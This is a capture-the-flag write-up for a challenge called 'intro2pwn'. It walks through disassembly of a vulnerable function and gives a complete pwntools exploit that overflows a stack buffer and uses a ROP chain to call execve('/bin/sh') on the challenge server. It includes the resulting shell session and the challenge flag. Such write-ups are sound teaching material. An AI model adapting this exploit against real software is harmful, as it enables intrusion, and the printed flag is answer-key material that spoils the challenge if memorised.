# intro2pwn

```
Written by virchau13

An introductory pwn challenge; classic buffer overflow.
nc challs.watctf.org 1991 
```

Decompile in [Binary Ninja](https://binary.ninja):

```c
004018d0    int64_t vuln()

004018d0  55                 push    rbp {__saved_rbp}
004018d1  be2cb04900         mov     esi, 0x49b02c  {"Addr: %p\n"}
004018d6  bf02000000         mov     edi, 0x2
004018db  31c0               xor     eax, eax  {0x0}
004018dd  4889e5             mov     rbp, rsp {__saved_rbp}
004018e0  53                 push    rbx {__saved_rbx}
004018e1  488d5db0           lea     rbx, [rbp-0x50 {var_58}]
004018e5  4889da             mov     rdx, rbx {var_58}
004018e8  4883ec48           sub     rsp, 0x48
004018ec  e8ff550200         call    ___printf_chk
004018f1  488b3df84e0c00     mov     rdi, qword [rel stdout]
004018f8  e8c3c60000         call    _IO_fflush
004018fd  4889de             mov     rsi, rbx {var_58}
00401900  bfface4900         mov     edi, 0x49cefa
00401905  31c0               xor     eax, eax  {0x0}
00401907  e894320000         call    __isoc99_scanf
0040190c  488b5df8           mov     rbx, qword [rbp-0x8 {__saved_rbx}]
00401910  c9                 leave    {__saved_rbp}
00401911  31c0               xor     eax, eax  {0x0}
00401913  31d2               xor     edx, edx  {0x0}
00401915  31f6               xor     esi, esi  {0x0}
00401917  31ff               xor     edi, edi  {0x0}
00401919  c3                 retn     {__return_addr}

004018d0    int64_t vuln()

004018d0    {
004018d0        ___printf_chk(2, "Addr: %p\n", 0);
004018f8        _IO_fflush(stdout);
00401907        __isoc99_scanf("%s", 0);
00401919        return 0;
004018d0    }
```

It gives us a stack leak and allows us to write data onto the stack. No stack canary, static binary without PIE, so we can use ROP to get shell:

1. Get stack address
2. Pop rdi, set rdi to syscall number 59 of execve
3. Set rax to rdi, so rax is 59
4. Pop rdi to point to `/bin/sh\0` on the stack
5. Execute syscall

```python
from pwn import *

elf = ELF("./vuln")
context.binary = elf
context.terminal = ["tmux", "split-w", "-h"]
context(arch="amd64", log_level="debug")

# p = process(["./vuln"])
p = remote("challs.watctf.org", 1991)
addr = int(p.recvline().split()[1], 16)
print(hex(addr))  # rsp
# gdb.attach(p)
# pause()
pop_rdi_ret = 0x42F5CF
mov_rax_rdi_xor_edi_edi_ret = 0x413334
syscall = 0x401267
rdi = addr + 0x88
buf = (
    b"A" * 0x58
    + p64(pop_rdi_ret)
    + p64(59)
    + p64(mov_rax_rdi_xor_edi_edi_ret)
    + p64(pop_rdi_ret)
    + p64(rdi)
    + p64(syscall)
    + b"/bin/sh\0"
)
p.sendline(buf)
p.interactive()
```

Get shell:

```shell
[*] Switching to interactive mode
$ id
[DEBUG] Sent 0x3 bytes:
    b'id\n'
[DEBUG] Received 0x1e bytes:
    b'uid=1000 gid=1000 groups=1000\n'
uid=1000 gid=1000 groups=1000
$ ls -al
[DEBUG] Sent 0x7 bytes:
    b'ls -al\n'
[DEBUG] Received 0xdc bytes:
    b'total 904\n'
    b'drwxr-xr-x 1 nobody nogroup   4096 Sep  9 19:26 .\n'
    b'drwxr-xr-x 1 nobody nogroup   4096 Sep  9 19:26 ..\n'
    b'-rw-rw-r-- 1 nobody nogroup     58 Sep  9 19:25 flag.txt\n'
    b'-rwxr-xr-x 1 nobody nogroup 904352 Sep  9 19:25 run\n'
total 904
drwxr-xr-x 1 nobody nogroup   4096 Sep  9 19:26 .
drwxr-xr-x 1 nobody nogroup   4096 Sep  9 19:26 ..
-rw-rw-r-- 1 nobody nogroup     58 Sep  9 19:25 flag.txt
-rwxr-xr-x 1 nobody nogroup 904352 Sep  9 19:25 run
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[DEBUG] Received 0x3a bytes:
    b'watctf{g00d_j0b_s0m3t1m3s_on_old_machines_this_1s_3n0ugh}\n'
watctf{g00d_j0b_s0m3t1m3s_on_old_machines_this_1s_3n0ugh}
[*] Got EOF while reading in interactive
$ 
[*] Closed connection to challs.watctf.org port 1991
```
